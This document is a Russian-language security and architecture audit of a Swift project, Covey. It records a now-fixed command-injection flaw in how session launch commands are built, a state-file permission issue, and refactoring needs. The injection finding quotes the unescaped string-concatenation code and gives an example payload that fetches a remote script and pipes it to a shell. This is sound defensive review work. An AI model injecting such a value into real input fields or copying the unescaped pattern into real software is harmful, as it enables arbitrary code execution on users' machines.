# Covey — аудит безопасности и архитектуры (2026-07-16)

Ручной аудит всего проекта (не diff-ревью), проведённый через `graphify` —
структурный граф (`graphify-out/graph.json`) использовался, чтобы найти god nodes
и точки, где код шеллится наружу / трогает FS-credentials/сокет, вместо чтения
всех 136 файлов подряд. Ниже — что нашли, с точными путями и строками, чтобы
можно было вернуться и чинить по частям.

## Безопасность

### ✅ FIXED (2026-07-16) — Command injection через custom agent/model/effort при создании сессии

Устранено: `composeLaunch`/`CreateService.prepare` перешли на argv-only запуск
(`LaunchCommand.argv`), `/bin/sh -c` остался только для `--resume` fallback
(covey-генерируемая строка, без пользовательского ввода). См. спек и план:
`docs/superpowers/specs/2026-07-16-create-session-argv-design.md`,
`docs/superpowers/plans/2026-07-16-create-session-argv.md`. Коммиты:
`2b75759` (composeAgentArgv/validateAgent), `1f77ec4` (миграция на LaunchCommand).

<details>
<summary>Исходная находка (для истории)</summary>

- `Sources/CoveyKit/CreateLogic.swift:56-61` (`composeAgentCommand`) склеивает
  `agent`, `model`, `effort` в строку **без экранирования**:
  ```swift
  public func composeAgentCommand(agent: String, model: String?, effort: String?) -> String {
      var cmd = agent
      if let model { cmd += " --model \(model)" }
      if let effort { cmd += " --effort \(effort)" }
      return cmd
  }
  ```
- `Sources/CoveydCore/CreateService.swift:24-30` для любой не-`terminal` сессии
  оборачивает результат в `["/bin/sh", "-c", resolveCommand(command)]`.
- `agent` приходит прямо из IPC-запроса `create` (`Sources/CoveydCore/IPCServer.swift:119`)
  **без валидации** — в отличие от `validateBranch`/`validateCreate`
  (`CreateLogic.swift:99-123`), для `agent`/`model`/`effort` валидатора нет.

**Impact:** строка вроде `claude; curl evil.sh|sh` в поле "custom agent" формы
New Session (или в сыром `create`-запросе к сокету) выполнится как shell-код.

**Почему это особенно странно:** ломает паттерн «только argv, никогда через
шелл», которого весь остальной код придерживается **сознательно**:
- `GitOps.run` (`Sources/CoveydCore/GitOps.swift:16-39`) — аргументы массивом в `Process`.
- `IssueService.runGh` (`Sources/covey/IssueService.swift:87-104`) — комментарий
  прямым текстом: *"Arguments go straight to the process — nothing passes
  through a shell."*
- `PTYProcess.spawn` (`Sources/CoveydCore/PTYProcess.swift:46-96`) — `execvp` напрямую.
- `GitOps.resolveAgentPath` (`GitOps.swift:250-266`) — комментарий: *"passed as
  $0, never interpolated into shell code (no injection)"*.

`CreateService` — единственное исключение, причём на самом чувствительном пути
(запуск агента).

**Оговорка по серьёзности:** сокет `chmod 0600` (`SocketServer.swift:45`) —
доступен только тому же пользователю, привилегии не эскалируются. Это не
privilege-escalation баг, а нарушение defense-in-depth и внутренней
согласованности модели безопасности.

**Что делать:** добавить `validateAgent`-подобную проверку (запрет
`;|&$\`\n` и т.п., или явный allow-list символов) до `composeAgentCommand`,
либо не заворачивать в `/bin/sh -c` вообще — передавать `agent`/флаги как
отдельные элементы `argv`, как это уже сделано во всех остальных местах.

</details>

### 🟡 LOW — `~/.covey/state.json` без явных прав доступа

`Sources/CoveyKit/PersistedState.swift` / `Sources/covey/StateStore.swift` не
выставляют права на файл при записи (в отличие от сокета — `chmod(path, 0o600)`
в `SocketServer.swift:45`), полагаются на umask по умолчанию.

Секретов там нет — OAuth-токен подтверждённо живёт только в памяти
(`Sources/covey/UsageService.swift:29-32`, `Sources/covey/Credentials.swift`),
но в `state.json` лежат черновики issue, которые не хочется отдавать
другим локальным пользователям при широком umask.

**Что делать:** `chmod 0600` на `state.json` после записи, аналогично сокету.

### ✅ Хорошие паттерны (для справки, ничего чинить не надо)

- Везде argv-массивы вместо шелла (`GitOps`, `IssueService`, `PTYProcess`).
- Сокет с правильными правами (`0600`) и разумным backlog (`listen(fd, 16)`).
- `SO_NOSIGPIPE` на accept — не роняет процесс при записи в закрытое соединение.
- NDJSON-фрейминг (`Connection.swift`, `NDJSONCodec.swift`) выглядит корректно.

## Архитектура / чистый код

### 🔴 God object — `Sources/covey/AppModel.swift` (1199 строк, degree 159 в графе — самый связанный узел во всём проекте)

Владеет одновременно: сессиями, терминалом, git-статусом, issue-браузером,
usage-лимитами, vim-режимом и key-routing — явное нарушение single
responsibility.

Видно, что фичи «поздних фаз» (git/issues/worktrees — HANDOFF.md §1
явно помечал их out-of-scope на фазу 1) просто дописывались в исходный
`AppModel` вместо вынесения в под-модели.

### 🟡 `Sources/CoveydCore/SessionRegistry.swift` (375 строк, degree 80)

Тот же паттерн на стороне демона: PTY-пул + персистентность реестра +
respawn-логика + status inference + git-monitoring интеграция — всё в одном месте.

### 🟡 `Sources/covey/KeyRouter.swift` — `KeyAction` enum (degree 52)

Один enum веером покрывает vim-режим, issues и сессии сразу —
клавиатурный слой не разбит по фичам/зонам.

### ⚪ Минорное — дублирующееся имя файла

`Sources/CoveyKit/SpawnEnvironment.swift` и `Sources/CoveydCore/SpawnEnvironment.swift`
— не дублирование логики (разные обязанности: PATH-enrichment для `gh`/GUI vs
terminal env vars для PTY-спавна), но одинаковый basename в двух таргетах
путает при навигации/grep. Стоит переименовать один из них
(например, `PathEnrichment.swift` и `TerminalEnvDefaults.swift`).

## Что уже проверено и не требует действий

- `resolveAgentPath`, `runGh`, `GitOps.run`, `PTYProcess.spawn` — все безопасны
  от command injection.
- OAuth-токен нигде не кэшируется на диск в открытом виде.
- Формат `state.json` — осознанный отход от TOML из HANDOFF.md (см. отдельное
  обсуждение), к безопасности не относится.

## Следующие шаги

Пункты не устранялись за один проход — фиксируем здесь, чтобы вернуться.

1. ~~command injection в `CreateService`/`CreateLogic`~~ — ✅ исправлено 2026-07-16.
2. разбивка `AppModel` (совпадает с ROADMAP.md, Этап 1)
3. разбивка `SessionRegistry` (совпадает с ROADMAP.md, Этап 0)
4. права на `state.json`
5. переименование дублирующихся файлов (`SpawnEnvironment.swift`)
6. `KeyRouter` по фичам
